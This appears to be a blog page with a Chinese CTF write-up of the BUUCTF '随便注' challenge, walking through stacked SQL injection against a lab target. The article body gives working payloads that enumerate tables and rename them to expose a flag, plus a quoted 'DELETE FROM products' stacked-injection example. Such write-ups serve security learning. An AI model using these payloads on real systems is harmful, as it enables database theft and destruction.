@@ -1,0 +1,168 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>BUU-随便注 | xxxRetr0</title><meta name="author" content="1"><meta name="copyright" content="1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="打开题目 1&#39; 页面不回显 1&#39;# 页面回显正常  至此判断存在sql注入    1’ or ‘1’&#x3D;’1 页面回显，则判断应该是字符型 接下来判断回显的字段数    1’ order by 1#和1’ order by 2#都回显正常，而1’ order by 3#就by不出来了，说明存在两个字段 这里发现select、update、delete、drop、insert、wher">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUU-随便注">
+<meta property="og:url" content="http://example.com/2022/03/12/BUU-%E9%9A%8F%E4%BE%BF%E6%B3%A8/index.html">
+<meta property="og:site_name" content="xxxRetr0">
+<meta property="og:description" content="打开题目 1&#39; 页面不回显 1&#39;# 页面回显正常  至此判断存在sql注入    1’ or ‘1’&#x3D;’1 页面回显，则判断应该是字符型 接下来判断回显的字段数    1’ order by 1#和1’ order by 2#都回显正常，而1’ order by 3#就by不出来了，说明存在两个字段 这里发现select、update、delete、drop、insert、wher">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<meta property="article:published_time" content="2022-03-12T12:39:29.000Z">
+<meta property="article:modified_time" content="2022-03-12T13:23:20.482Z">
+<meta property="article:author" content="1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/03/12/BUU-%E9%9A%8F%E4%BE%BF%E6%B3%A8/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'BUU-随便注',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2022-03-12 21:23:20'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="xxxRetr0" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">29</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">xxxRetr0</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BUU-随便注</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-03-12T12:39:29.000Z" title="Created 2022-03-12 20:39:29">2022-03-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-03-12T13:23:20.482Z" title="Updated 2022-03-12 21:23:20">2022-03-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="BUU-随便注"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>打开题目<br><img src="https://i.bmp.ovh/imgs/2022/03/838f512e858c6807.png"></p>
+<pre><code>1&#39; 页面不回显
+1&#39;# 页面回显正常
+</code></pre>
+<p>至此判断存在sql注入<br>    1’ or ‘1’=’1 页面回显，则判断应该是字符型</p>
+<p>接下来判断回显的字段数<br>    1’ order by 1#和1’ order by 2#都回显正常，而1’ order by 3#就by不出来了，说明存在两个字段<br><img src="https://s3.bmp.ovh/imgs/2022/03/57459a9299ad3de4.png"></p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/03/c233ba7a16a551fb.png"><br>这里发现select、update、delete、drop、insert、where、.（点）  被过滤掉，一下子过滤掉那么多，就开始考虑堆叠注入</p>
+<p>这里是第一次做到堆叠注入的题目，于是搜了一下堆叠注入的大概👇👇👇</p>
+<p>堆叠注入原理:<br>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在分号（;）结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。<br>用户输入：1; DELETE FROM products<br>服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products<br>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除<br>            作者：简简的我</p>
+<pre><code>1&#39;;show tables;#
+</code></pre>
+<p><img src="https://s3.bmp.ovh/imgs/2022/03/7ec79f2d1ab6c343.png"></p>
+<pre><code>1&#39;; show columns from `words`; #（这里用到 ` 而不是 &#39; ）
+</code></pre>
+<p><img src="https://s3.bmp.ovh/imgs/2022/03/7cee4d8733f8d085.png"></p>
+<pre><code>1&#39;; show columns from `1919810931114514`; #
+</code></pre>
+<p><img src="https://s3.bmp.ovh/imgs/2022/03/57d1ddf6acdacb04.png"></p>
+<p>回显内容总是来自word这张表，想要查询flag里面的字段，得另想办法<br>而上面的过滤内容中没有rename和alter<br>于是想着直接给表名和字段名改掉</p>
+<pre><code>1&#39;;alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(100);# 
+</code></pre>
+<p>最后再来一个1’ or ‘1’=’1<br><img src="https://s3.bmp.ovh/imgs/2022/03/88e899bddb4c17a0.png"></p>
+<p>做到这里还是挺勉强的，看了很多大佬的wp，发现还有很多东西不熟悉，加油！！！</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/03/12/BUU-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">http://example.com/2022/03/12/BUU-%E9%9A%8F%E4%BE%BF%E6%B3%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/02/26/2022%E6%98%A5%E8%80%83%E8%AF%95/"><img class="next-cover" src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">2022春考试</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">1</div><div class="author-info__description">yaHuuuuuu</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">29</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/03/12/BUU-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" title="BUU-随便注"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUU-随便注"/></a><div class="content"><a class="title" href="/2022/03/12/BUU-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" title="BUU-随便注">BUU-随便注</a><time datetime="2022-03-12T12:39:29.000Z" title="Created 2022-03-12 20:39:29">2022-03-12</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2022/02/26/2022%E6%98%A5%E8%80%83%E8%AF%95/" title="2022春考试">2022春考试</a><time datetime="2022-02-26T11:55:01.000Z" title="Created 2022-02-26 19:55:01">2022-02-26</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2022/02/23/sqlilabs/" title="sqlilabs">sqlilabs</a><time datetime="2022-02-23T12:15:02.000Z" title="Created 2022-02-23 20:15:02">2022-02-23</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2022/01/31/MySQL%E3%80%817/" title="MySQL、7">MySQL、7</a><time datetime="2022-01-31T07:30:40.000Z" title="Created 2022-01-31 15:30:40">2022-01-31</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2022/01/29/MySQL%E3%80%816/" title="MySQL、6">MySQL、6</a><time datetime="2022-01-29T15:28:23.000Z" title="Created 2022-01-29 23:28:23">2022-01-29</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 1</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
